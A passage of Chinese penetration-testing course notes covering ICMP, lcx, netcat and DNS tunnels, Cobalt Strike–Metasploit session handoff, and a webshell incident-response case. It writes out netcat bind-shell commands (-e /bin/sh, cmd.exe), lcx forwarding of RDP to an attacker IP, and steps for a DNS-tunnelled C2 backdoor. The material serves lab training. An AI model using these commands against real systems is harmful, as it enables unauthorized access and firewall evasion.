![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3oq3Xb6dc8KjGOCYYk9dREMtzE55MlahoRUqicKibbPwCssUFuC6rOqrA%2F640%3Fwx_fmt%3Dpng)

再kali主机上执行运行命令。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3IcseS3z3F3xBgr7C1IXficrCoiaT3fh1aFlIYKSibKAd0iaibzEdNKEErwg%2F640%3Fwx_fmt%3Dpng)

发现有流量过来：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3ibrHtVrWqxkDP7j7YIr8kt66ZnHYNyU4icDg5BdhxlYubPeF0MScGdzQ%2F640%3Fwx_fmt%3Dpng)

连接本地1080端口：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3s0ib8IlUPhCIcEckadSFHzibNvgRl9TNyEBvB5NQLpicGuXhLKEtlETPA%2F640%3Fwx_fmt%3Dpng)

弹出远程连接端口

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3KODa6qzUJ3G0kPiawcvT85SjKRlStXLE7ia4opr2QUee834uVs8Xgk5A%2F640%3Fwx_fmt%3Dpng)

在Target3上我们发现3389端口正在被Target2请求,实际上是kali请求的

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3IUOaVGyALt9yz5t7x9B88s6mLGZw3gAJKrqLGngdmnaKF6RzEMe0Xw%2F640%3Fwx_fmt%3Dpng)

现在远程连接它走的不是以前的那个协议,而是ICMP流量的数据

把3389流量转成了ICMP流量

### 案例3-传输层转发隧道Portmap使用-检测,利用

端口转发,环境是域环境

Windows:lcx

Linux:portmp

lcx -slave 攻击IP3131 127.0.0.1 3389 //将本地3389给攻击IP的3131

lcx -listen 3131 3333//监听3131转发至3333

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3z9vJpS1dzXMa0uNxHvS3xmwvO8WjRXYmWfIM6Wq6I5hCia22KDOcUibA%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3PNZzuX5WTCkjmDJ0wlQsHDzPE3qvicib1G1Ba2EAq7x5ycJGAO5e82tA%2F640%3Fwx_fmt%3Dpng)

用kali连接WEbserver的7777

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3hGbvNGPuCRjcDzwqY4RN8xzDYWzjzAeiappqzAWLRvNn5Ydcow47D6Q%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3XK8HTjBCbway3m5PUphUNGa4zKY2Vgn4DUz3ibMyyXUWC9zxlDZTpYA%2F640%3Fwx_fmt%3Dpng)

### 案例4-传输层转发隧道Netcat使用-检测,利用,功能

kali-god\\webserver-god\\sqlserver | dc

1.双向连接反弹shell

正向:攻击连接受害

受害:nc -ldp 1234 -e /bin/sh //linux

nc -ldp 1234 -e c:\\windows\\system32\\cmd.exe //windows

攻击:nc 192.168.76.132 1234 //主动连接

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3v0goIIrMoa1cRV9VXxMymjqqwmicGYgQ0sFHMnibq8mib6Gr74MfwWang%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3dMWzu50C4qkblukEBTVx8u8SdnG988WibloyhyYoj7DW2hsWccxeahQ%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3auO9QJt0patkEsib9NwWo9cU63er9pFR9BkGOh38snVjWuOSicDZVLMw%2F640%3Fwx_fmt%3Dpng)

    反弹回会话

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3R3DONibxDD4BAmoI9tn7QKxtDoW1fFibXJz5nSHSmib32IFY2HISREaeg%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3kabRAuBeCHzaHAOhrzgGltckZ7aDBzqldCbribGGUVNmMUMz39tVZBg%2F640%3Fwx_fmt%3Dpng)

反弹回shell

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3L9lpBhptjIYdlb8UX4MUgzlcL1VZgoXt0N7l4u6dk2Kic8B2l4cYLjg%2F640%3Fwx_fmt%3Dpng)

2.多向连接反弹shell-配合转发

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3XeqzORxwAKpficIFHKgaErAgzmfIia5DxABC2s6w41SADFicQTlo6ia2yA%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3CUIxppFAFe4XicKCGchgRDCGVyJvH9Iv6vVlKUfSr4ibFYFKVsonXtJw%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd32rmL32tzxhxI9c6fEc7JZPhZyWezMcWj0klnNWuMbxrrKdUEFlynuA%2F640%3Fwx_fmt%3Dpng)

直接反弹回来了shell

3.相关netcat主要功能测试

指纹服务:nc -nv 192.168.76.143

端口服务:nc -v -z 192.168.76.143 1-100

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3HxVhFIcOgKZLbAmoWDC6PiayMVZlSJb42ns9MgDn50YfibDONiabIUibVQ%2F640%3Fwx_fmt%3Dpng)

端口监听:nc -lvp xxxx

```
文件传输:nc -lp 1111 >1.txt | nc -vn xx.xx.xx.xx 1111 <1.txt -q 1                  
														 >
```

### 案例5-应用层DNS隧道配合CS上线-检测,利用,说明

当常⻅协议监听器被拦截时,可以换其他协议上线,其中的dns协议上线基本通杀

1.云主机Teamserver配置端口53启用-udp

2.买一个域名修改解析记录如下:

A记录-cs主机名-cs服务器ip

NS记录-ns1主机名-上个A记录地址

NS记录-ns2主机名-上个A记录地址

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3t2SpoyF7DmZexicDlFNxJXVeWYNib4Gicwyia1lbeoJfRdrosp466d4sqw%2F640%3Fwx_fmt%3Dpng)

3.配置DNS监听器内容如下:

ns1.xiaodi8.com

ns2.xiaodi8.com

cs.xiaodi8.com

在CS中添加监听器

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3Lcs4GF4w1icoYxYoSApdIulLxsyWEIh6t4odvOA8ME54XMQRyEKJXoQ%2F640%3Fwx_fmt%3Dpng)

4.生成后⻔执行上线后启用命令:

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd36D46C8zrJu7HSFXmpT2ZiaYbhCdkCeVbmbnVRjCXVV1EWNzzPlI20XA%2F640%3Fwx_fmt%3Dpng)

xiaodi-pc\\xiaodi

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3KZvbECSkydVV5yxJbic9uw0mYwpOxQPsYia5ShmxbkHUoK4lI2hly33Q%2F640%3Fwx_fmt%3Dpng)

执行完命令之后

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3hc3yq7uaRzO9KlYfribEOCkhUEjWflJLScg6NsXHCicXXtt7x9catkMw%2F640%3Fwx_fmt%3Dpng)

生成后⻔:

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3opnaR4BRXW6qjfk9Tqk7Lgy9DoEB5VnK6yVDOjHPpqOxNoH7HXibubg%2F640%3Fwx_fmt%3Dpng)

上传后⻔,执行,上线

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3ML1AyOnrc65w9ELaiaIhqZic5vKGwdyEAgcO9Z2pPDHibTYRe03GOZtrw%2F640%3Fwx_fmt%3Dpng)

dns上线后视图中的电脑和其他协议不同,速度慢,还要执行几条命令才能行

学隧道的意义?

测试的协议可能会被拦截。

有个网站是有80端口 ,http服务的。有漏洞,但访问不了,一访问就断断续续或直接访问不到。原因可能是对方防火墙禁止你的IP访问或者检测到有异常,这个时候,如果去搞的话,都是http协议,我们可以换个协议去搞

* * *

## Day72.域横向 CSMSF 联动及应急响应初识


演示案例:

### MSFCobaltStrike联动shell

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3Zlyibm5cbZmAUfcTWgz0WkHaPicU6aLdYArxpRlcUG3O1FNB0DlCA4Rw%2F640%3Fwx_fmt%3Dpng)

目标机:

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd30GkbPict7XJLconE3ibg40zGEjbYficBAo0vJ7nXZdlXCkiakwkG5xslaw%2F640%3Fwx_fmt%3Dpng)

启动CS服务端

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3JgOa763bQk72kk7FEpngXKUlyyib9I4AOaAPlcuzDW6kVaMklu7Kic4A%2F640%3Fwx_fmt%3Dpng)

启动CS客户端

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3GmcwJvlvGMeGZZZkicxBE4NsduNUFSicW7U2XLxXyDlTmk4HbicOg6dicQ%2F640%3Fwx_fmt%3Dpng)

目标机执行木⻢,在CS上上线

启动MSF

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3OgdTPXczB4EHExhNhlp2nxs7UHX0RmiaCwLkfVdYANy5O7CPuUm3WBg%2F640%3Fwx_fmt%3Dpng)

接下来,将CS移交到MSF上,首先,有创建一个监听器,host是msf所在服务器IP

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3PiaoGdN1picv1iaEpFug1uia1vaibshsOHmicgXWDoiaUIF9QnoOHicwDJpdqA%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3xJibA59r39AztwKRlcrmdoRQDlIHkgibq22kWeXiaIAUSWibvvTWPiaKxEQ%2F640%3Fwx_fmt%3Dpng)

在msf上创建监听器,payload要和cs监听器协议一样,端口也要一样

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3BXbdGH0AqwrIvZ1AMRnvibpY0UD9S39IYyIl0bUboxue362OZ1oNrwg%2F640%3Fwx_fmt%3Dpng)

想要反弹哪个会话,点击视图中对应的电脑,选择Spawn

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3tpYX08LkufjxXEZlatHHyIzibG6NyAGMXDd0s8XdDnQtQb2Q7iclyjlg%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3cYCh21CqFOXprMm627L1q50Gc03ZyicLb29zoO2PV24wtfmhFSTE86Q%2F640%3Fwx_fmt%3Dpng)

在msf处上线

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3AbQqdBqlGYziadPRmibHf8CwLcicAv5q4FgibFiahteVr1ebwj1LWcd1Yjw%2F640%3Fwx_fmt%3Dpng)

从msf到cs,先记录要返回session的id

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3kdFLmSm9z5AK8YdX8xBcnXHtRyrBYZYlxRmhiariahgmQic9B1o54w3pw%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3A556wjIo1kqqLP0d4aCD95ia6A7xxqwIDiazbaDmvs226t7y9quPEH1A%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3t3dy7MSIiaL87x9RJqwIQgfCRrFYjEAeHVPk9FzcJUSvmoFjibIpIyew%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3mjCeictibbRJs1qYTBtMeIX36XoLGV8psE14klfLTuB95LjvqtEZibX8Q%2F640%3Fwx_fmt%3Dpng)

目前三台主机在cs上

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3jNmgn8pYslNch6XxaJoYFLqqSJh7oDzfwWD5QfVIib6Q4BIu6rznD4Q%2F640%3Fwx_fmt%3Dpng)

现在成了4台

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3C5XB6G8pqiaCuR5dORzudoUjKkuhl5gFwEOBOZt3TxNXRyvhwb9zn5g%2F640%3Fwx_fmt%3Dpng)

### 案例2-web攻击应急响应溯源-后⻔,日志

故事回顾:某顾客反应自己的网站首⻚出现被篡改,请求置源

分析:涉及的攻击面 涉及的操作权限 涉及的攻击意图(修改网站为了干嘛?,可以从修改的网站来分析) 涉及的攻击方式等

思路1:

利用日志定位修改时间基数,将前时间进行攻击分析,后时间进行操作分析

思路2:

利用后⻔webshell查杀脚本或工具找到对应后⻔文件,定位第一时间分析先查看开放的端口,再查看端口所对应的服务

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd35GiaEEbcKGIaMMQ4cDt1SKxRaZp1TL4KmaUVyBLqmfUia8xM5agIdElg%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3PRFcsO5g1VpYrvE3sj8XP332LbTHvK5golW3wIjqfWbLED4iaxRMM1g%2F640%3Fwx_fmt%3Dpng)

通过任务管理器找到该进程的路径

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3U2XIBBosicCmicTWMD2Fv4gODF9LSpRm8lhia6O6zZG4dm5ibGGOeLCsRA%2F640%3Fwx_fmt%3Dpng)

看到是由Apache搭建的,Apache有日志记录

首⻚被修改,首⻚可能是index等地址

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3sa0lfF0HiadVFf8ER95wxKVN4slUXokskwZwM70T7L0Uwc3eBtic2Ncg%2F640%3Fwx_fmt%3Dpng)

通过查看发现这个x.php很特殊,对应找到网站目录

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3qVW8jTSUkqqSSdBuHkxibrjSrgxtIEInUuiaYSJHuvaxYZPPyh57WGFg%2F640%3Fwx_fmt%3Dpng)

打开发现是一个后⻔

可以根据工具的指纹来发现是什么工具

后⻔查杀工具

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3qn97wOL1UJcmUosIRG1WQLk0jibh4VP0FIkwe3WHRPURQe8cwRExTzg%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3lNUFgDUx1iaicKaE7qpUn3bGN5y2hwgaE61Hq4OcXdLCJFMBCDNkrJHw%2F640%3Fwx_fmt%3Dpng)

后⻔会占用资源

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3jWpPDpsII17nZjnDm6geXJdtibrrRkwU1ewXD9yiaRCYfxaVFbaicZx7g%2F640%3Fwx_fmt%3Dpng)

监管进程,标为蓝色的为系统外进程,属于第三方

看到可以进程,但还是不能确定是木⻢。可以分析,这个进程启动后有什么操作,对外连接吗?

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3cB1rZa6yPgoDib4DmGO8dfA3qLjWBicDQhBNkicnHBohic5fGLEuHlTPzQ%2F640%3Fwx_fmt%3Dpng)

查看网络,发现有网络连接,可以确定是木⻢

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3DhSzIEhAxRTlicOUoYwlOs6GVdXeOpzsDXokib3Yicq1s4sficicawYamgw%2F640%3Fwx_fmt%3Dpng)

检查文件执行记录,可以用来分析木⻢的执行时间

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8ENx28GoiaIWzm1REOnZpd3ib9VRMJa85NAPMltbNJZV61hvpctnODvgRQXwo3rzfMxVrgnwdMEh4A%2F640%3Fwx_fmt%3Dpng)

再通过这个时间去查找日志前后

* * *
